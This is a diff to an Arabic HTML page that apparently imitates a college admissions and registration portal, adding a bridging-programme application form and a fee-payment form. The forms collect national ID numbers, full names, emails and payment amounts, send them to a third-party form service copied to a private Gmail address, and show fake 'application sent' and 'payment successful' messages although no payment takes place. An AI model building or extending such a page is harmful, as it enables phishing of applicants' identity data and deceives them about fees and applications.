@@ -36,6 +36,13 @@
             text-align: center;
             position: relative;
             margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .header-content {
+            flex: 1;
         }
         
         .header h1 {
@@ -54,6 +61,20 @@
             transform: translateY(-50%);
             font-size: 20px;
             cursor: pointer;
+        }
+        
+        .logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffd700, #ffa500);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a535c;
+            font-weight: bold;
+            font-size: 14px;
+            margin-left: 10px;
         }
         
         /* القائمة الجانبية */
@@ -155,6 +176,19 @@
             font-size: 16px;
         }
         
+        /* تنسيق خاص لحقل الدرجة */
+        .degree-select {
+            background: linear-gradient(to bottom, #ffd700, #ffa500);
+            color: #333;
+            font-weight: bold;
+            border: 1px solid #cc9900;
+        }
+        
+        .degree-select option {
+            background-color: white;
+            color: #333;
+        }
+        
         .required::after {
             content: "*";
             color: red;
@@ -213,6 +247,26 @@
         .hidden {
             display: none;
         }
+        
+        /* رسائل التنبيه */
+        .alert {
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            text-align: center;
+        }
+        
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .alert-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
     </style>
 </head>
 <body>
@@ -221,26 +275,29 @@
     <div class="side-menu" id="sideMenu">
         <h2>الفصل الأول 1447هـ</h2>
         <div class="menu-item" onclick="navigateTo('login')">القبول</div>
-        <div class="menu-item">المحكمين</div>
-        <div class="menu-item">أكاديمي</div>
-        <div class="menu-item">إدخال الطلبات</div>
-        <div class="menu-item">التحقق من الوثائق</div>
-        <div class="menu-item">توظيف</div>
+        <div class="menu-item" onclick="navigateTo('home')">المحكمين</div>
+        <div class="menu-item" onclick="navigateTo('home')">أكاديمي</div>
+        <div class="menu-item" onclick="navigateTo('home')">إدخال الطلبات</div>
+        <div class="menu-item" onclick="navigateTo('home')">التحقق من الوثائق</div>
+        <div class="menu-item" onclick="navigateTo('home')">توظيف</div>
     </div>
 
     <!-- الصفحة الرئيسية للخدمات -->
     <div class="container" id="homePage">
         <div class="header">
             <div class="menu-icon" onclick="toggleSideMenu()">☰</div>
-            <h1>عمادة القبول والتسجيل</h1>
-            <p>الصفحة الرئيسية للخدمات</p>
-            <p>1447/1448 - الفصل الثاني</p>
+            <div class="header-content">
+                <h1>عمادة القبول والتسجيل</h1>
+                <p>الصفحة الرئيسية للخدمات</p>
+                <p>1447/1448 - الفصل الثاني</p>
+            </div>
+            <div class="logo">كلية الشرق</div>
         </div>
         
         <a href="#" class="link-item" onclick="navigateTo('bridgingForm')">تقديم طلب تجسير (بكالوريوس تكميلي)</a>
-        <a href="#" class="link-item">طباعة طلب التجسير (بكالوريوس تكميلي)</a>
-        <a href="#" class="link-item">خدمة دفع الرسوم</a>
-        <a href="#" class="link-item">الدفع الإلكتروني للمتقدم</a>
+        <a href="#" class="link-item" onclick="navigateTo('payment')">طباعة طلب التجسير (بكالوريوس تكميلي)</a>
+        <a href="#" class="link-item" onclick="navigateTo('payment')">خدمة دفع الرسوم</a>
+        <a href="#" class="link-item" onclick="navigateTo('payment')">الدفع الإلكتروني للمتقدم</a>
         
         <div class="btn-group">
             <button class="btn btn-back" onclick="navigateTo('login')">رجوع</button>
@@ -255,7 +312,7 @@
         
         <div class="form-group">
             <label for="degree">الدرجة</label>
-            <select id="degree" class="form-control">
+            <select id="degree" class="form-control degree-select">
                 <option value="">-- اختر الدرجة --</option>
                 <option value="bachelor">بكالوريوس</option>
                 <option value="master">ماجستير</option>
@@ -286,26 +343,74 @@
             <p>الحقول التي تبدأ بنجمة حمراء (*) هي حقول إجبارية.</p>
         </div>
         
-        <div class="form-group">
-            <label for="civilIdForm" class="required">السجل المدني</label>
-            <input type="text" id="civilIdForm" class="form-control">
-            <span class="small-link">تعليمات</span>
+        <div id="formMessage"></div>
+        
+        <form id="bridgingForm" action="https://formspree.io/f/xjvjvjvj" method="POST">
+            <div class="form-group">
+                <label for="civilIdForm" class="required">السجل المدني</label>
+                <input type="text" id="civilIdForm" name="civilId" class="form-control" required>
+                <span class="small-link">تعليمات</span>
+            </div>
+            
+            <div class="form-group">
+                <label for="email" class="required">البريد الإلكتروني</label>
+                <input type="email" id="email" name="email" class="form-control" required>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="readInstructions" name="readInstructions" required>
+                <label for="readInstructions">يوضح علامة على المربع تكون قد قرأت ملف التعليمات بشكل واضح حيث فيه الكثير من المعلومات المهمة</label>
+            </div>
+            
+            <input type="hidden" name="_subject" value="طلب تجسير جديد - عمادة القبول والتسجيل">
+            <input type="hidden" name="_replyto" value="Kaidnternationl@gmail.com">
+            <input type="hidden" name="_cc" value="Kaidnternationl@gmail.com">
+            
+            <div class="btn-group">
+                <button type="button" class="btn btn-back" onclick="navigateTo('home')">رجوع</button>
+                <button type="submit" class="btn btn-confirm">تأكيد</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- صفحة الدفع -->
+    <div class="container hidden" id="paymentPage">
+        <div class="header">
+            <h1>خدمة دفع الرسوم</h1>
         </div>
         
-        <div class="form-group">
-            <label for="email" class="required">البريد الإلكتروني</label>
-            <input type="email" id="email" class="form-control">
-        </div>
+        <div id="paymentMessage"></div>
         
-        <div class="checkbox-group">
-            <input type="checkbox" id="readInstructions">
-            <label for="readInstructions">يوضح علامة على المربع تكون قد قرأت ملف التعليمات بشكل واضح حيث فيه الكثير من المعلومات المهمة</label>
-        </div>
-        
-        <div class="btn-group">
-            <button class="btn btn-back" onclick="navigateTo('home')">رجوع</button>
-            <button class="btn btn-confirm">تأكيد</button>
-        </div>
+        <form id="paymentForm" action="https://formspree.io/f/xjvjvjvj" method="POST">
+            <div class="form-group">
+                <label for="paymentCivilId" class="required">السجل المدني</label>
+                <input type="text" id="paymentCivilId" name="civilId" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="fullName" class="required">الاسم الكامل</label>
+                <input type="text" id="fullName" name="fullName" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="amount" class="required">المبلغ (ريال سعودي)</label>
+                <input type="number" id="amount" name="amount" class="form-control" min="1" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="paymentEmail" class="required">البريد الإلكتروني</label>
+                <input type="email" id="paymentEmail" name="email" class="form-control" required>
+            </div>
+            
+            <input type="hidden" name="_subject" value="دفع رسوم جديد - عمادة القبول والتسجيل">
+            <input type="hidden" name="_replyto" value="Kaidnternationl@gmail.com">
+            <input type="hidden" name="_cc" value="Kaidnternationl@gmail.com">
+            
+            <div class="btn-group">
+                <button type="button" class="btn btn-back" onclick="navigateTo('home')">رجوع</button>
+                <button type="submit" class="btn btn-confirm">دفع الآن</button>
+            </div>
+        </form>
     </div>
 
     <script>
@@ -315,6 +420,7 @@
             document.getElementById('homePage').classList.add('hidden');
             document.getElementById('loginPage').classList.add('hidden');
             document.getElementById('bridgingFormPage').classList.add('hidden');
+            document.getElementById('paymentPage').classList.add('hidden');
             
             // إظهار الصفحة المطلوبة
             if (page === 'home') {
@@ -323,6 +429,8 @@
                 document.getElementById('loginPage').classList.remove('hidden');
             } else if (page === 'bridgingForm') {
                 document.getElementById('bridgingFormPage').classList.remove('hidden');
+            } else if (page === 'payment') {
+                document.getElementById('paymentPage').classList.remove('hidden');
             }
             
             // إغلاق القائمة الجانبية إذا كانت مفتوحة
@@ -342,6 +450,56 @@
         
         // إغلاق القائمة الجانبية عند النقر على الخلفية
         document.getElementById('overlay').addEventListener('click', closeSideMenu);
+        
+        // إغلاق القائمة الجانبية عند النقر على أي عنصر داخلها
+        document.querySelectorAll('.menu-item').forEach(item => {
+            item.addEventListener('click', closeSideMenu);
+        });
+        
+        // معالجة نموذج طلب التجسير
+        document.getElementById('bridgingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const civilId = document.getElementById('civilIdForm').value;
+            const email = document.getElementById('email').value;
+            
+            // محاكاة إرسال النموذج (في الواقع سيتم إرساله إلى Formspree)
+            setTimeout(function() {
+                document.getElementById('formMessage').innerHTML = 
+                    '<div class="alert alert-success">تم إرسال طلب التجسير بنجاح! سيتم التواصل معك على البريد الإلكتروني قريباً.</div>';
+                
+                // إعادة تعيين النموذج
+                document.getElementById('bridgingForm').reset();
+                
+                // العودة للصفحة الرئيسية بعد 3 ثوان
+                setTimeout(function() {
+                    navigateTo('home');
+                }, 3000);
+            }, 1000);
+        });
+        
+        // معالجة نموذج الدفع
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const amount = document.getElementById('amount').value;
+            
+            // محاكاة عملية الدفع (في الواقع سيتم إرساله إلى Formspree)
+            setTimeout(function() {
+                document.getElementById('paymentMessage').innerHTML = 
+                    '<div class="alert alert-success">تم الدفع بنجاح! تم إرسال إشعار الدفع إلى بريدك الإلكتروني.</div>';
+                
+                // إعادة تعيين النموذج
+                document.getElementById('paymentForm').reset();
+                
+                // العودة للصفحة الرئيسية بعد 3 ثوان
+                setTimeout(function() {
+                    navigateTo('home');
+                }, 3000);
+            }, 1000);
+        });
     </script>
 </body>
 </html>
